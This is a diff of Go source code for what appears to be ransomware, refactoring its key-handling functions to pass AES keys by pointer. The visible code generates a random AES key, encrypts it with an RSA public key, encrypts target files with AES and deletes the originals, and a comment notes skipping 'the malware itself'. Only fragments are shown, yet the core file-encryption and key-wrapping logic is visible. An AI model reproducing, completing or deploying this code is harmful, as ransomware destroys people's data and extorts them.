@@ -29,14 +29,12 @@ func GenerateRSA() *rsa.PrivateKey {
 }
 
 //Generate random 32-byte AES key
-func GenerateAES() []byte {
-	aesBytes := make([]byte, 32)
+func GenerateAES(aesBytes *[]byte) {
+	*aesBytes = make([]byte, 32)
 
-	if _, err := rand.Read(aesBytes); err != nil {
+	if _, err := rand.Read(*aesBytes); err != nil {
 		log.Fatal(err)
 	}
-
-	return aesBytes
 }
 
 // Save AES key to file system, hex encoded. Key can be plaintext or encrypted
@@ -57,18 +55,16 @@ func SaveAESKey(aesBytes []byte, fileName string) {
 }
 
 // Read hex encoded AES key from file and return byte array. Key can be encrypted or unencrypted, but must be hex encoded
-func LoadAESKey(filename string) []byte {
+func LoadAESKey(aesKey *[]byte, filename string) {
 	encodedBytes, err := ioutil.ReadFile(filename)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	aesBytes, err := hex.DecodeString(string(encodedBytes))
+	*aesKey, err = hex.DecodeString(string(encodedBytes))
 	if err != nil {
 		log.Fatal(err)
 	}
-
-	return aesBytes
 }
 
 // Saves RSA private key to file in x509 PKCS1 format
@@ -158,12 +154,12 @@ func LoadRSAPublicKey(fileName string) rsa.PublicKey {
 }
 
 //Encrypt the AES key with OAEP RSA public key
-func EncryptAESKey(aesBytes []byte, pubkey rsa.PublicKey) []byte {
+func EncryptAESKey(aesBytes *[]byte, pubkey rsa.PublicKey) []byte {
 	encryptedBytes, err := rsa.EncryptOAEP(
 		sha256.New(),
 		rand.Reader,
 		&pubkey,
-		aesBytes,
+		*aesBytes,
 		nil)
 	if err != nil {
 		log.Fatal(err)
@@ -182,7 +178,7 @@ func DecryptAESKey(encryptedAESKey []byte, privateKey rsa.PrivateKey) []byte {
 	return decyptedAESKey
 }
 
-func EncryptFile(filename string, extension string, aeskey []byte) {
+func EncryptFile(filename string, extension string, aeskey *[]byte) {
 
 	// Don't want to encrypt the malware itself ;) or any already encrypted files
 	switch {
@@ -211,7 +207,7 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 	}
 
 	// Create cipher block using an AES key
-	block, err := aes.NewCipher(aeskey)
+	block, err := aes.NewCipher(*aeskey)
 	if err != nil {
 		log.Println(err)
 	}
@@ -258,7 +254,7 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 	os.Remove(filename)
 }
 
-func DecryptFile(filename string, extension string, aeskey []byte) {
+func DecryptFile(filename string, extension string, aeskey *[]byte) {
 	// Open target file
 	infile, err := os.Open(filename + extension)
 	if err != nil {
@@ -269,7 +265,7 @@ func DecryptFile(filename string, extension string, aeskey []byte) {
 	defer infile.Close()
 
 	// Create cipher block using an AES key
-	block, err := aes.NewCipher(aeskey)
+	block, err := aes.NewCipher(*aeskey)
 	if err != nil {
 		log.Println(err)
 	}
